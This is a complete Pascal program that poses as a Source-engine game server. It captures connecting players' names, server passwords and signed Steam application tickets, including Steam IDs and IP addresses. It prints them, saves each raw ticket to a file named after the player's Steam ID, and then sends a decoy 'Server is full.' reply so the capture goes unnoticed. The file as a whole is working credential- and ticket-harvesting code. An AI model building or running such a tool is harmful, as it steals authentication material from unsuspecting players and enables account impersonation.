program tranquility_gather;

uses bytebuffer, sysutils, srcnet;

{$INCLUDE srcnet.ph}

const
	CRLF = #13 + #10;

type
	appticket_t = packed record
		m_size : longword;
		m_version : longword;
		m_steamid : qword;
		m_appid : longword;
		m_external_ip : longword;
		m_internal_ip : longword;
		m_unknown1 : longword;
		m_creation_time : longword;
		m_expiration_time : longword;
		m_unknown2 : word;
		m_unknown3 : word;
		m_unknown4 : longword;
	end;
	
function saveticket(databuf : pbytebuffer_t) : boolean;
var
	i : word;
	pckdata : POINTER;
	dumpfile : TEXT;

	cl_net_protocol : longword = 0;
	cl_auth_protocol : longword = 0;
	gs_challenge : longword = 0;
	cl_name : string = '';
	cl_password : string = '';
	cl_version : string = '';
	cl_appticket_size : word = 0;

	ticket_header_size : longword = 0;
	ticket_header_token : qword = 0;
	ticket_header_steamid : qword = 0;
	ticket_header_time : longword = 0;
	
	ticket_data_size : longword = 0;
	ticket_data_struct : appticket_t;
	ticket_data_signature : array[1..128] of byte;
begin
	cl_net_protocol := bb_read_num32(databuf);
	
	if cl_net_protocol <> PROTOCOL_VERSION then
		exit(false);

	cl_auth_protocol := bb_read_num32(databuf);
	
	if cl_auth_protocol <> PROTOCOL_STEAM then
		exit(false);

	gs_challenge := bb_read_num32(databuf);
	
	if gs_challenge <> $BAADF00D then
		exit(false);

	if not bb_read_string(databuf, @cl_name) then
		exit(false);
	
	if not bb_read_string(databuf, @cl_password) then
		exit(false);
	
	if not bb_read_string(databuf, @cl_version) then
		exit(false);

	cl_appticket_size := bb_read_num16(databuf);
	
	if (cl_appticket_size = 0) or (cl_appticket_size > 2048) then
		exit(false);
	
	ticket_header_size := bb_read_num32(databuf);
	
	if ticket_header_size < 8 then
		exit(false);
		
	ticket_header_token := bb_read_num64(databuf);
	
	if ticket_header_size >= 16 then
	begin
		ticket_header_steamid := bb_read_num64(databuf);

		if ticket_header_size >= 20 then
			ticket_header_time := bb_read_num32(databuf);
	end;
	
	ticket_data_size := bb_read_num32(databuf);
	
	if not bb_read_bytes(databuf, @ticket_data_struct, sizeof(ticket_data_struct)) then
		exit(false);
	
	if not bb_read_bytes(databuf, @ticket_data_signature, 128) then
		exit(false);

	writeln(CRLF, 'Packet summary: ', CRLF);

	writeln('Net protocol: ', cl_net_protocol);
	writeln('Auth protocol: ', cl_auth_protocol);
	writeln('Challenge: ', gs_challenge);
	writeln('Name: ', cl_name);
	writeln('Password: ', cl_password);
	writeln('Version: ', cl_version);
	
	writeln('Application ticket (AT) size: ', cl_appticket_size);

	writeln('Application ticket header (ATH) size: ', ticket_header_size);
	writeln('ATH token: ', ticket_header_token);
	writeln('ATH client ID: ', ticket_header_steamid);
	writeln('ATH time: ', ticket_header_time);
	
	writeln('AT data (ATD) + signature size: ', ticket_data_size);
	writeln('ATD size: ', ticket_data_struct.m_size);
	writeln('ATD version: ', ticket_data_struct.m_version);
	writeln('ATD client ID: ', ticket_data_struct.m_steamid);
	writeln('ATD game ID: ', ticket_data_struct.m_appid);
	writeln('ATD client external IP: ', ticket_data_struct.m_external_ip);
	writeln('ATD client internal IP: ', ticket_data_struct.m_internal_ip);
	writeln('ATD unknown (1): ', ticket_data_struct.m_unknown1);
	writeln('ATD creation time: ', ticket_data_struct.m_creation_time);
	writeln('ATD expiration time: ', ticket_data_struct.m_expiration_time);
	writeln('ATD unknown (2): ', ticket_data_struct.m_unknown2);
	writeln('ATD unknown (3): ', ticket_data_struct.m_unknown3);
	writeln('ATD unknown (4): ', ticket_data_struct.m_unknown4);
	
	assign(dumpfile, IntToStr(ticket_data_struct.m_steamid) + '.bin');
	rewrite(dumpfile);

	pckdata := POINTER(bb_getdata(databuf)) + 5;

	for i := 0 to bb_getdatasize(databuf)-6 do
		write(dumpfile, CHAR((pckdata + i)^));

	close(dumpfile);
end;

procedure net_processoob(t : char; databuf : pbytebuffer_t; from : SOCKADDR_IN);
var
	reply : array[1..2048] of byte;
	replybuf : bytebuffer_t;
begin
	replybuf := bb_write_new(@reply, 2048);

	writeln('Received ', t, ' packet');

	case t of
		'q':
		begin	
			bb_write_num32(@replybuf, $FFFFFFFF);
			bb_write_char(@replybuf, 'A');
			bb_write_num32(@replybuf, $BAADF00D);
			bb_write_num32(@replybuf, PROTOCOL_STEAM);
			bb_write_num16(@replybuf, 0);
			bb_write_num64(@replybuf, 0);
			bb_write_byte(@replybuf, 1);
			bb_write_string(@replybuf, '000000');
		end;
		'k':
		begin
			if not saveticket(databuf) then
				writeln('Invalid k packet received');

			bb_write_num32(@replybuf, $FFFFFFFF);
			bb_write_char(@replybuf, '9');
			bb_write_string(@replybuf, 'Server is full.');
		end;
	end;

	if bb_getpos(@replybuf) > 0 then
		net_sendoob(from, @replybuf);
end;

begin
	net_setoobhandle(@net_processoob);

	if not net_startup('192.168.1.9', 27015) then
		exit();

	net_begin();
	net_shutdown();

	writeln('Press any key to exit...');
	readln();
end.